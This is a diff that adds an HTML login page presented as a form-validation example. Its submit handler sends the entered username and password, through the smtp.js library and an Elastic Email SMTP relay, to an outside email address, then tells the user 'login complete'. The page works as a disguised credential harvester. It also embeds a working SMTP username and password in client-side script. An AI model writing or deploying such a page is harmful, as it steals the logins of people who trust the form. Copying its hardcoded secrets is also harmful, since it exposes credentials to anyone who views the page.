@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>HTML5 Login Form with validation Example</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="login.css">
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div id="login-form-wrap">
+  <h2>Login</h2>
+  <form id="login-form">
+    <p>
+    <input type="text" id="username" name="username" placeholder="Username" required><i class="validation"><span></span><span></span></i>
+    </p>
+    <p>
+    <input type="password"id="password" name="password" placeholder="password" required><i class="validation"><span></span><span></span></i>
+    </p>
+    <p>
+    <input type="submit"onclick="sendmsg()"id="login" value="Login">
+    </p>
+  </form>
+  <div id="create-account-wrap">
+    <p>Not a member? <a href="#">Create Account</a><p>
+  </div><!--create-account-wrap-->
+</div><!--login-form-wrap-->
+<!-- partial -->
+  
+<!-- ---Javascript---->
+<script>
+  function sendmsg() {
+
+   Email.send({
+Host: "smtp.elasticemail.com",
+ Username: "coderbhai077@gmail.com",
+Password: "8FB731420B77B3A4956E82BDCDBA8CFA6A73",
+To: 'mridul0741.be23@chitkara.edu.in',
+  From: "coderbhai07@gmail.com",
+                                    Subject:"About my front end project",
+                                    Body: "username:"+document.getElementById("username").value +
+                                    "<br>password:"+document.getElementById("password").value 
+                                })
+                                .then(
+                                    message => alert("login complete")
+                                );
+                            
+                            }
+</script>
+</body>
+</html>
